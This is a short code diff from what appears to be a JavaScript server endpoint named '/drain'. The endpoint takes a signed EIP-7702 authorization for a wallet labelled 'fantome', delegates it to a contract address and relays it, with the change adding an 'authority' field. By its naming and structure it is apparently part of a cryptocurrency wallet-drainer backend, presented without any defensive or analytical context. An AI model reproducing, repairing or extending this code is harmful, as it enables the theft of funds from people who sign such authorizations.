@@ -64,7 +64,6 @@ app.post("/drain", async (req, res) => {
 
     const authNonce = await provider.getTransactionCount(fantome, "latest");
 
-    // Meme forme exacte que ce que produit authorize()
     const authorization = {
       chainId: BigInt(auth.chainId),
       address: CONTRACT,
@@ -72,6 +71,7 @@ app.post("/drain", async (req, res) => {
       yParity: "0x" + Number(auth.yParity).toString(16),
       r: auth.r.startsWith("0x") ? auth.r : "0x" + auth.r,
       s: auth.s.startsWith("0x") ? auth.s : "0x" + auth.s,
+      authority: fantome,
     };
 
     const nonce = await provider.getTransactionCount(wallet.address, "latest");
